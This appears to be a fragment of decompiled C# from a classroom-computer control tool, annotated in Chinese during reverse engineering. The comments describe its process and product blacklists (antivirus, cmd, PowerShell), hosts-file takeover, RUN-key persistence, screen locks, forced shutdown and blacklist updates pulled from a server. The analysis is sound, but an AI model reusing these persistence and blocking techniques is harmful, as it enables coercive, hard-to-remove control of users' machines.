		private bool ifeoWarningShown;

		// Token: 0x0400002A RID: 42
		/// <summary>
		/// 杀毒检测开关（原名 _ServiceConfig）：读 HKCU\Software\jfglzs\shadu_jianche，"off" 时进程黑名单从索引 11 扫起。
		/// </summary>
		private string shaduCheckRegistryValue;

		// Token: 0x0400002B RID: 43
		/// <summary>
		/// U 盘检测开关（原名 m_ThreadConfig）：读 HKCU\Software\jfglzs\usb_jianche。
		/// </summary>
		private string usbCheckRegistryValue;

		// Token: 0x0400002C RID: 44
		/// <summary>
		/// cmd 检测开关（原名 _PublisherConfig）：读 HKCU\Software\jfglzs\cmd_jianche，"off" 时产品黑名单从索引 4 扫起。
		/// </summary>
		private string cmdCheckRegistryValue;

		// Token: 0x0400002D RID: 45
		/// <summary>
		/// 电子教室配置串（原名 m_BroadcasterConfig）：读 HKCU\Software\jfglzs\dzjs，逗号分隔的进程列表，Split 后存入 classroomProcessList。
		/// </summary>
		private string dzjsRegistryValue;

		// Token: 0x0400002E RID: 46
		/// <summary>
		/// 电子教室进程名列表（原名 _EventConfig，string[6]）：由 dzjs 配置拆分，供模式1守护遍历。
		/// </summary>
		private string[] classroomProcessList;

		// Token: 0x0400002F RID: 47
		/// <summary>
		/// 进程名黑名单（原名 schemaConfig，string[101]）：索引 1~3 备用、4~10 杀软、11~13 关键字、14~21 游戏/压缩软件、22~28 对抗工具；服务端下发的产品名不在此数组。
		/// </summary>
		private string[] processNameBlacklist;

		// Token: 0x04000030 RID: 48
		/// <summary>
		/// 产品名/描述黑名单（原名 authenticationConfig，string[201]）：索引 1~78 内置（cmd/PowerShell/进程工具/极域对抗工具等），79 起由服务端 hmd_net.txt 动态追加。
		/// </summary>
		private string[] productDescriptionBlacklist;

		// Token: 0x04000031 RID: 49
		/// <summary>
		/// 内置产品黑名单数量（原名 procConfig）=78，服务端追加从 79 开始。
		/// </summary>
		private int productBlacklistCount;

		// Token: 0x04000032 RID: 50
		/// <summary>
		/// 字符串（混淆残留，未使用）。
		/// </summary>
		private string m_TemplateVisitor;

		// Token: 0x04000033 RID: 51
		/// <summary>
		/// 电子教室副本路径（原名 configVisitor）：= classroomProcessPath + "2"（xxx.exe2 备份）。
		/// </summary>
		private string backupFilePath;

		// Token: 0x04000034 RID: 52
		/// <summary>
		/// 整型（混淆残留，未使用）。
		/// </summary>
		private int _VisitorVisitor;

		// Token: 0x04000035 RID: 53
		/// <summary>
		/// 电子教室守护模式（原名 _IdentifierVisitor）：0=无守护；1=进程名型；2=路径型。
		/// </summary>
		private int classroomGuardMode;

		// Token: 0x04000036 RID: 54
		/// <summary>
		/// 字符串（混淆残留，未使用）。
		/// </summary>
		private string m_DispatcherVisitor;

		// Token: 0x04000037 RID: 55
		/// <summary>
		/// 防火墙违规计数（原名 customerVisitor）：>5 次锁屏。
		/// </summary>
		private int firewallViolationCount;

		// Token: 0x04000038 RID: 56
		/// <summary>
		/// 网络违规计数（原名 m_TokenizerVisitor）：>5 次锁屏。
		/// </summary>
		private int networkViolationCount;

		// Token: 0x04000039 RID: 57
		/// <summary>
		/// 整型（混淆残留，未使用）。
		/// </summary>
		private int valueVisitor;

		// Token: 0x0400003A RID: 58
		/// <summary>
		/// 电子教室进程丢失计数（原名 m_MethodVisitor）：≥5 次强制关机。
		/// </summary>
		private int classroomNotFoundCount;

		// Token: 0x0400003B RID: 59
		/// <summary>
		/// 电子教室被暂停计数（原名 parameterVisitor）：>8 警告，>10 锁屏。
		/// </summary>
		private int classroomPausedCount;

		// Token: 0x0400003C RID: 60
		/// <summary>
		/// 密码修改计数（原名 m_InterceptorVisitor）：>25 次锁屏。
		/// </summary>
		private int passwordViolationCount;

		// Token: 0x0400003D RID: 61
		/// <summary>
		/// 极域参数修改计数（原名 predicateVisitor）：>5 次锁屏。
		/// </summary>
		private int jiyuParamViolationCount;

		// Token: 0x0400003E RID: 62
		/// <summary>
		/// 极域服务异常计数（原名 attributeVisitor）：>5 次锁屏。
		/// </summary>
		private int jiyuServiceViolationCount;

		// Token: 0x0400003F RID: 63
		/// <summary>
		/// 整型（混淆残留，未使用）。
		/// </summary>
		private int m_ObjectVisitor;

		// Token: 0x04000040 RID: 64
		/// <summary>
		/// IFEO 修改计数（原名 m_StateVisitor）：>5 次锁屏。
		/// </summary>
		private int routeIfeoViolationCount;

		// Token: 0x04000041 RID: 65
		/// <summary>
		/// 整型（混淆残留，未使用）。
		/// </summary>
		private int helperVisitor;

		// Token: 0x04000042 RID: 66
		/// <summary>
		/// 长整型（混淆残留，未使用）。
		/// </summary>
		private long connectionVisitor;

		// Token: 0x04000043 RID: 67
		/// <summary>
		/// 极域 ChannelId 基准值（原名 _ParserVisitor）。
		/// </summary>
		private int jiyuChannelId;

		// Token: 0x04000044 RID: 68
		/// <summary>
		/// 极域 AutoLogin 基准值（原名 strategyVisitor）。
		/// </summary>
		private int jiyuAutoLogin;

		// Token: 0x04000045 RID: 69
		/// <summary>
		/// 极域注册表位数标志（原名 expressionVisitor）：1=64 位(Wow6432Node 路径)，2=32 位路径。
		/// </summary>
		private int jiyuRegistryBitness;

		// Token: 0x04000046 RID: 70
		/// <summary>
		/// 极域服务监控开启标志（原名 m_PropertyVisitor）：tdfilefilter/tdnetfilter 均在运行时才 true。
		/// </summary>
		private bool jiyuServiceMonitorEnabled;

		// Token: 0x04000047 RID: 71
		/// <summary>
		/// 主密码哈希（原名 dicVisitor）：读 HKCU\Software\n，与 SHA256(输入+"bfdshgs") 比对。
		/// </summary>
		private string masterPasswordHash;

		// Token: 0x04000048 RID: 72
		/// <summary>
		/// RUN 键 prozs 的基准值（原名 m_ResolverVisitor）：被改则写回 启动目录\przs.exe。
		/// </summary>
		private string runKeyProzsValue;

		// Token: 0x04000049 RID: 73
		/// <summary>
		/// RUN 键 jfglzsn 的基准值（原名 m_DecoratorVisitor）：被改则写回 启动目录\jfglzsn.exe。
		/// </summary>
		private string runKeyJfglzsnValue;

		// Token: 0x0400004A RID: 74
		/// <summary>
		/// 未使用路径（原名 _PolicyVisitor）："C:\Program Files (x86)\" + 随机名第2~5位，后续未使用（残留）。
		/// </summary>
		private string unusedInstallPath;

		// Token: 0x0400004B RID: 75
		/// <summary>
		/// 腾讯电脑管家过滤驱动服务 tdfilefilter（原名 merchantVisitor）：强制拉起/监控。
		/// </summary>
		private ServiceController tencentFileFilterService;

		// Token: 0x0400004C RID: 76
		/// <summary>
		/// 腾讯电脑管家网络过滤驱动服务 tdnetfilter（原名 m_WorkerVisitor）：强制拉起/监控。
		/// </summary>
		private ServiceController tencentNetFilterService;

		// Token: 0x0400004D RID: 77
		/// <summary>
		/// 有线网卡 IP 基准（原名 m_SerializerVisitor）：首次记录，后续变化即判定"修改IP地址"。
		/// </summary>
		private string wiredNetworkIp;

		// Token: 0x0400004E RID: 78
		/// <summary>
		/// 产品黑名单命中位置（原名 _BridgeVisitor）：按命中索引分级处理（≤6 Kill / ==43 静默 / >50 Kill+删文件）。
		/// </summary>
		private int productMatchIndex;

		// Token: 0x0400004F RID: 79
		/// <summary>
		/// 高危开关（原名 _ProxyVisitor）：读 HKCU\Software\jfglzs\gaowei，默认 2；==1 时解压软件不 Kill。
		/// </summary>
		private int gaoweiHighRiskFlag;

		// Token: 0x04000050 RID: 80
		/// <summary>
		/// 工作目录（原名 initializerVisitor）："C:\windows\jf"，存放 zmserv.dat/przs.dat 待释放文件。
		/// </summary>
		private string jfWorkingDir;

		// Token: 0x04000051 RID: 81
		/// <summary>
		/// hosts 是否已被接管（原名 _ContextVisitor）：true 表示已写入黑名单并置为只读隐藏系统属性。
		/// </summary>
		private bool hostsAdopted;

		// Token: 0x04000052 RID: 82
		/// <summary>
		/// 字符串（混淆残留，未使用）。
		/// </summary>
		private string configurationVisitor;

		// Token: 0x04000053 RID: 83
		/// <summary>
		/// 字符串（混淆残留，未使用）。
		/// </summary>
		private string m_ObserverVisitor;

		// Token: 0x04000054 RID: 84
		/// <summary>
		/// hosts 文件路径（原名 m_FilterVisitor）：C:\Windows\System32\drivers\etc\hosts（备份为 hosts2）。
		/// </summary>
		private string hostsFilePath;

		// Token: 0x04000055 RID: 85
		/// <summary>
		/// 进程黑名单命中位置（原名 m_ProccesorVisitor）：按命中索引分级处理（≤10 警告 / ≤16 Kill / ≤21 解压软件 / >21 Kill+删文件）。
		/// </summary>
		private int processMatchIndex;

		// Token: 0x04000056 RID: 86
		public const int WM_DEVICECHANGE = 537;

		// Token: 0x04000057 RID: 87
		public const int DBT_DEVICEARRIVAL = 32768;

		// Token: 0x04000058 RID: 88
		public const int DBT_CONFIGCHANGECANCELED = 25;

		// Token: 0x04000059 RID: 89
		public const int DBT_CONFIGCHANGED = 24;

		// Token: 0x0400005A RID: 90
		public const int DBT_CUSTOMEVENT = 32774;

		// Token: 0x0400005B RID: 91
		public const int DBT_DEVICEQUERYREMOVE = 32769;

		// Token: 0x0400005C RID: 92
		public const int DBT_DEVICEQUERYREMOVEFAILED = 32770;

		// Token: 0x0400005D RID: 93
		public const int DBT_DEVICEREMOVECOMPLETE = 32772;

		// Token: 0x0400005E RID: 94
		public const int DBT_DEVICEREMOVEPENDING = 32771;

		// Token: 0x0400005F RID: 95
		public const int DBT_DEVICETYPESPECIFIC = 32773;

		// Token: 0x04000060 RID: 96
		public const int DBT_DEVNODES_CHANGED = 7;

		// Token: 0x04000061 RID: 97
		public const int DBT_QUERYCHANGECONFIG = 23;

		// Token: 0x04000062 RID: 98
		public const int DBT_USERDEFINED = 65535;

		// Token: 0x04000063 RID: 99
		/// <summary>
		/// WMI 进程监视器（原名 accountVisitor）：监听 __InstanceCreationEvent/Win32_Process，处理器 WmiProcessCreated_CheckViolation。
		/// </summary>
		private ManagementEventWatcher wmiProcessWatcher;

		// Token: 0x04000064 RID: 100
		/// <summary>
		/// 当前新进程名（原名 codeVisitor）：WMI 事件中记录，供警告水印/匹配用。
		/// </summary>
		private string currentProcessName;

		// Token: 0x04000065 RID: 101
		/// <summary>
		/// 电子教室进程名（原名 m_RulesVisitor）：模式2 守护对象（去 .exe）。
		/// </summary>
		private string classroomProcessName;

		// Token: 0x04000066 RID: 102
		/// <summary>
		/// 电子教室进程路径（原名 _ValVisitor）：模式2 守护对象全路径，NotFound 时从 .exe2 副本恢复。
		/// </summary>
		private string classroomProcessPath;

		// Token: 0x04000067 RID: 103
		/// <summary>
		/// C2 服务器主机名（原名 _ManagerVisitor）：读 HKCU\Software\jfglzs\zhuye，黑名单 URL = http://<zhuye>/hmd_net.txt。
		/// </summary>
		private string serverHostname;

		// Token: 0x04000068 RID: 104
		/// <summary>
		/// 常量 19（混淆残留，未使用）。
		/// </summary>
		private const int m_TaskVisitor = 19;

		// Token: 0x04000069 RID: 105
		/// <summary>
		/// 常量 0（混淆残留，未使用）。
		/// </summary>
		private const int m_RuleVisitor = 0;

		// Token: 0x0400006A RID: 106
		/// <summary>
		/// 常量 1（混淆残留，未使用）。
		/// </summary>
		private const int m_DatabaseVisitor = 1;

		// Token: 0x0400006B RID: 107
		/// <summary>
		/// 常量 2（混淆残留，未使用）。
		/// </summary>
		private const int _IssuerVisitor = 2;

		// Token: 0x0400006C RID: 108
		/// <summary>
		/// 常量 2（混淆残留，未使用）。
		/// </summary>
		private const int mapVisitor = 2;

		// Token: 0x0400006D RID: 109
		/// <summary>
		/// 常量 17（混淆残留，未使用）。
		/// </summary>
		private const byte m_ErrorVisitor = 17;

		// Token: 0x0400006E RID: 110
		/// <summary>
		/// 常量 76（混淆残留，未使用）。
		/// </summary>
		private const byte paramVisitor = 76;

		// Token: 0x0400006F RID: 111
		/// <summary>
		/// 常量 67（混淆残留，未使用）。
		/// </summary>
		private const byte _RegistryVisitor = 67;

		// Token: 0x04000070 RID: 112
		/// <summary>
		/// 常量 87（混淆残留，未使用）。
		/// </summary>
		private const byte _MappingVisitor = 87;

		// Token: 0x04000071 RID: 113
		/// <summary>
		/// 常量 18（混淆残留，未使用）。
		/// </summary>
		private const byte _WriterVisitor = 18;

		// Token: 0x04000072 RID: 114
		/// <summary>
		/// 常量 115（混淆残留，未使用）。
		/// </summary>
		private const byte iteratorVisitor = 115;

		// Token: 0x04000073 RID: 115
		/// <summary>
		/// 常量 27（混淆残留，未使用）。
		/// </summary>
		private const byte _CreatorVisitor = 27;

		// Token: 0x04000074 RID: 116
		/// <summary>
		/// List<string>（混淆残留，未使用）。
		/// </summary>
		private List<string> descriptorVisitor;

		// Token: 0x04000075 RID: 117
		/// <summary>
		/// List<string>（混淆残留，未使用）。
		/// </summary>
		private List<string> exporterVisitor;

		// Token: 0x04000076 RID: 118
		/// <summary>
		/// 字符串（混淆残留，未使用）。
		/// </summary>
		private string _IndexerVisitor;

		// Token: 0x04000077 RID: 119
		/// <summary>
		/// 长整型（混淆残留，未使用）。
		/// </summary>
		private long m_SpecificationVisitor;

		// Token: 0x04000078 RID: 120
		/// <summary>
		/// 同伴进程启动计数（原名 m_ItemVisitor）：≥5 次重建 zmserv 服务并自重启。
		/// </summary>
		private long companionLaunchCount;

		// Token: 0x04000079 RID: 121
		/// <summary>
		/// 字符串（混淆残留，未使用）。
		/// </summary>
		private string _DefinitionVisitor;

		// Token: 0x0400007A RID: 122
		/// <summary>
		/// 布尔标志（混淆残留，未使用）。
		/// </summary>
		private bool _ContainerVisitor;

		// Token: 0x02000009 RID: 9
		/// <summary>
		/// 目标进程状态枚举：Running / Suspended / NotResponding / NotFound（供电子教室守护使用）。
		/// </summary>
		public enum ProcessStatus
		{
			// Token: 0x0400007C RID: 124
			Running,
			// Token: 0x0400007D RID: 125
			Suspended,
			// Token: 0x0400007E RID: 126
			NotResponding,
			// Token: 0x0400007F RID: 127
			NotFound
		}
	}
}
